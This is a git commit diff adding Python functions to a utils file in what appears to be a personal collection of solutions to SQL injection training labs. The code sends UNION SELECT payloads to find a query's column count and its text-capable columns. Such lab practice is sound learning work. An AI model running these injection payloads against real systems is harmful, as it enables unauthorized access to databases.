ac27b7bff9b3d00cdfe008e71cad113aac335cb1
madi <madimirzakup@gmail.com>
2025-01-13 18:31:07 +0500

    #

--- Server Side Topics/SQLi/WTF_WTF_SQL injection UNION attack, retrieving multiple values in a single column/utils.py
+++ Server Side Topics/SQLi/WTF_WTF_SQL injection UNION attack, retrieving multiple values in a single column/utils.py
@@ -21,3 +21,42 @@ def normalize_url(url):
         url = url + "/"
     return url
 
+def determine_number_of_columns(url, no_proxy):
+    log.info("Determining number of columns")
+    nulls_list=["NULL"]
+    num_columns = None
+    while len(nulls_list) < 10:
+        nulls = ",".join(nulls_list)
+        category = f"' UNION SELECT {nulls}-- "
+        exploit_url = url + category
+        if no_proxy: 
+            resp = requests.get(exploit_url)
+        else: 
+            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
+        if resp.status_code == 200:
+            num_columns = len(nulls_list)
+            break
+        nulls_list.append("NULL")
+    if num_columns:
+        log.info(f"number of columns if: {num_columns}")
+    return num_columns
+
+
+def determine_text_columns(url, no_proxy, num_columns):
+    text_columns = []
+    for i in range(0, num_columns):
+        nulls_list = ["NULL"] * num_columns
+        nulls_list[i] = "'a'"
+        nulls = ",".join(nulls_list)
+        category = f"' UNION SELECT {nulls}-- "
+        exploit_url = url + category 
+        if no_proxy: 
+            resp = requests.get(exploit_url)
+        else: 
+            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
+        if resp.status_code == 200:
+            text_columns.append(i)
+    if text_columns:
+        text_columns_str = ", ".join(map(str, text_columns))
+        log.info(f"The text columns are: {text_columns_str}")
+    return text_columns
